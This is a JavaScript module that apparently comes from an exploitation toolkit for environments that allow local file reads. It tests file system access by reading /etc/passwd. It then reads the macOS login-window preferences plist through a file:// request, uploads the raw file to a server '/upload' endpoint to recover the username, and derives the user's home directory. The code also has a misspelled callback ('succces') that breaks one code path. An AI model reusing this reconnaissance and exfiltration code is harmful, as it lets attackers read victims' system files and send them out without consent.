"use strict";


define(["utils", "platform"], function(utils, platform) {

    return {
        
        platform: platform,
        utils: utils,
    
        // Currently only detects unix-like file systems
        isFileSystemAccessbile: function(callbacks) {
            this.getFile('/etc/passwd', {
                success: function(data) {
                    if (data && data.length) {
                        callbacks.succces();
                    } else {
                        callbacks.failure();
                    }
                },
                failure: callbacks.failure
            });
        },

        getFile: function(filePath, callbacks) {
            var fileReq = new XMLHttpRequest();
            fileReq.responseType = 'arraybuffer';
            fileReq.onreadystatechange = function() {
                if (fileReq.readyState == XMLHttpRequest.DONE) {
                    if (fileReq.status === 200 && callbacks.success) {
                        callbacks.success(fileReq.response);
                    } else if (callbacks.failure) {
                        callbacks.failure();
                    }
                }
            }
            fileReq.open('GET', filePath, true);
            fileReq.send(null);
        },

        getMacOSUsername: function(callbacks) {
            var path = 'file:///Library/Preferences/com.apple.loginwindow.plist';
            var _this = this;
            this.getFile(path, {
                success: function(data) {
                    console.log('Got plist data, uploading to server ...');
                    _this.utils.POST('/upload', data, {
                        success: function(username) {
                            console.log('Username is: ' + username);
                            if (callbacks.success) {
                                callbacks.success(username);
                            }
                        },
                        failure: function() {
                            console.log('Server failed to parse plist data');
                            if (callbacks.failure) {
                                callbacks.failure();
                            }
                        }
                    });
                },
                failure: function() {
                    console.log('Failed to get file data for: ' + path);
                    callbacks.failure();
                }
            });
        },

        getHomeDirectory: function(callbacks) {
            var _this = this;
            this.getMacOSUsername({
                success: function(username) {
                    var os = _this.platform.operatingSystem();
                    if (os === 'macos') {
                        callbacks.success('/Users/' + username);
                    } else {
                        callbacks.failure();
                    }
                }
            });
        }
    }
});